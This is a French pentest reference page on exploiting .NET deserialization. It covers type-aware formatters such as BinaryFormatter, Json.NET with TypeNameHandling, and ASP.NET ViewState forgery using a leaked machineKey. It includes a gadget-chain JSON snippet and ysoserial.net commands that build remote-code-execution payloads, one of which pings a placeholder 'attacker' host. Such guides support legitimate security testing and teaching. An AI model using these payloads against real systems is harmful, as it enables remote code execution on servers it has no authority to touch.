---
order: 5
title: "Désérialisation .NET : BinaryFormatter, TypeNameHandling et ViewState"
description: "Exploiter la désérialisation .NET : sinks BinaryFormatter/LosFormatter, TypeNameHandling de Json.NET, ViewState d'ASP.NET, et génération de gadgets avec ysoserial.net."
keywords:
  - désérialisation .NET
  - BinaryFormatter
  - TypeNameHandling
  - ViewState
  - ysoserial.net
---

# Désérialisation .NET

Les désérialiseurs .NET qui préservent l'information de type peuvent être orientés pour instancier des types choisis par l'attaquant et exécuter leur logique de reconstruction, donnant une **exécution de code à distance** par chaîne de gadgets. Les formateurs non sécurisés classiques embarquent les types dans le flux ; les bibliothèques JSON deviennent non sécurisées lorsqu'elles sont configurées pour honorer une indication de type.

## Les sinks

- **`BinaryFormatter.Deserialize`**, **`LosFormatter`**, **`ObjectStateFormatter`**, **`SoapFormatter`**, **`NetDataContractSerializer`** : formateurs binaires/XML conscients du type, non sécurisés sur des entrées non fiables. La sortie BinaryFormatter en base64 commence souvent par `AAEAAAD/////`.
- **Json.NET (`Newtonsoft.Json`) avec `TypeNameHandling`** réglé sur autre chose que `None` : le JSON porte un champ `$type` nommant le type CLR à instancier, qui est le point d'injection :

  ```json
  { "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
    "MethodName": "Start", "ObjectInstance": { "$type": "System.Diagnostics.Process, System", ... } }
  ```

- **`JavaScriptSerializer`** avec un `SimpleTypeResolver` personnalisé, et **`XmlSerializer`/`DataContractSerializer`** lorsque le type attendu est influencé par l'attaquant.

## ViewState

Le **`__VIEWSTATE`** d'ASP.NET est un blob `LosFormatter`/`ObjectStateFormatter`. Lorsqu'il n'est pas protégé par un MAC valide (MAC désactivé, ou `machineKey` connu ou fuité), un attaquant forge un ViewState qui se désérialise en un gadget. `ysoserial.net` dispose d'un plugin ViewState dédié qui prend la clé et le générateur :

```
ysoserial.exe -p ViewState -g TextFormattingRunProperties \
  -c "cmd /c ping attacker" --apppath="/" --path="/page.aspx" \
  --decryptionalg="AES" --decryptionkey=... --validationalg="SHA1" --validationkey=...
```

Un `machineKey` fuité ou par défaut (issu d'une divulgation de configuration) transforme le ViewState en RCE fiable.

## Génération de gadgets

Utilisez **ysoserial.net** pour produire des payloads pour le formateur et le gadget en jeu :

```
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "calc"
ysoserial.exe -f Json.Net -g ObjectDataProvider -c "cmd /c whoami"
```

Livrez dans l'encodage attendu par le formateur (base64 pour la plupart des formateurs binaires).

## Notes d'exploitation

- Identifiez d'abord le formateur ; le gadget (`TypeConfuseDelegate`, `ObjectDataProvider`, `WindowsIdentity`, `TextFormattingRunProperties`) doit correspondre à la fois au formateur et aux assemblies disponibles (WPF `PresentationFramework`, etc.).
- Pour Json.NET, vous avez besoin de `TypeNameHandling != None` du côté qui désérialise ; sondez en envoyant un `$type` et en guettant un comportement de chargement de type ou des erreurs.
- Le ViewState exige de déjouer le MAC : cherchez un `web.config`/`machineKey` divulgué, une valeur par défaut connue, ou des pages où le MAC est désactivé.

## Outils

- **ysoserial.net** : formateurs, gadgets et plugin ViewState.

## Références

- PortSwigger Web Security Academy: Insecure deserialization
- ysoserial.net project
